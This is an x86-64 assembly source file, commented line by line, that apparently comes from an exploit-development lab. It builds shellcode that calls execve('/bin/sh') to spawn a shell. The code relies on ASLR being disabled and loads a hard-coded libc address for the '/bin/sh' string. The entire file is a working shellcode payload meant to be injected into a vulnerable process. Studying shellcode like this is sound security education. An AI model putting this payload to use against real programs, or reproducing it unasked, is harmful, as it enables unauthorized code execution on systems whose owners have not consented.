#include <sys/syscall.h>
/*
	This is the shellcode's program code section
*/
.global main
.type main, @function

main:   /* This is where the shellcode starts execution */
	
	/* Assign the system call number = 59 for SYS_EXECVE system call */
	movq $59, %rax /* Trying to load the 59 into the %rax register */
	/*
	   The RDI register contains the first argument passed into called
	   functions in the x86_64 architecture. In this case, the first
	   argument passed into the execve function is "/bin/sh".

	  Fortunately, the "/bin/sh" string can be found in the
	  dynamically linked c library "libc.so".

	  Taking advantage of the fact that ASLR is not enabled, we know that
	  the linked "libc.so" library will be lcoated in the same position
	  of the compiled executable each time its run. Therefore, we can just
	  load in the fixed memory address of the "/bin/sh" string for usage
	*/
	xorq %rdi, %rdi		    /* Clear the rdi register for further processing */
	movq $0x7ffff7dfa064,  %rdi /* Initialize the rdi register with the fixed address of the "/bin/sh" string */
	/*
	   The RSI register contains the second argument passed into a function.
	   In this case, it is SYS_EXECVE's argv = 0 to indicate that there
	   are no arguments passed into the /bin/sh shell
	*/
	movq $0, %rsi
	/*
	   The RDX register contains the third argument passed into a function.
	   In this case, it is the SYS_EXECVE's envp = 0 to indicate that there
	   are no environmental variables passed into the launched "/bin/sh" shell
	*/
	movq $0, %rdx
	/*
	   We call execve("/bin/sh", argv=[], envp=[])
	*/
	syscall
